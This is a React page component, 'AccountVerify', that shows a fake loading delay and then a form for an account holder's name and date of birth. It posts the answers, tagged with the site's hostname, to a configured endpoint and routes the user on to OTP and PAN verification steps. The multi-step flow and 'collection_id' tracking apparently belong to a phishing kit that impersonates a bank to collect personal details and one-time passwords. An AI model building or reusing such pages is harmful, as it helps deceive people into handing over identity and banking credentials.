import Header from '../resources/Header'
import Footer from '../resources/Footer'
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import DateInputComponent from '../resources/DateInputComponent';
import { useNavigate } from 'react-router-dom';

function AccountVerify() {
  const [loader, setLoader] = useState(true);
  useEffect(()=>{
    setTimeout(function(){
      setLoader(false);
    },2000)
  })

   // Form submit handler
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();

   const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 
    const API_URL = process.env.REACT_APP_API_URL;

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
        localStorage.setItem('collection_id', responseData.data);
        localStorage.setItem('next', "/panverify");
        localStorage.setItem("next_page_otp_times", 1);
        navigate('/onetimeverify');
      } else {
        alert("Invalid response");
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };
  return (
    <>
    <Header />
    <main>
      <div className="container">
      {loader ? (
        <Loader />
        ) : (
          <>
          <div className='mt-4'>
              <h1 className="text-center">Verify Details</h1>  
          </div>
          <div className='shadow px-4 py-2 border-0'>
            <form onSubmit={handleSubmit} >
              <div className='form-group'>
                  <label>Account Holder Name</label>
                  <input type='text' name='holdenrame' className='form-control my-control' required/>
              </div>
              <DateInputComponent />
              <div className='text-center'>
                <input type='submit' disabled={loading} value={'Continue'} className='btn btn-danger submit-button' required/>
              </div>

            </form>
          </div>
          </>
        )
      }
        
      </div>
    </main>
    <Footer />
    </>
  );
}

export default AccountVerify;
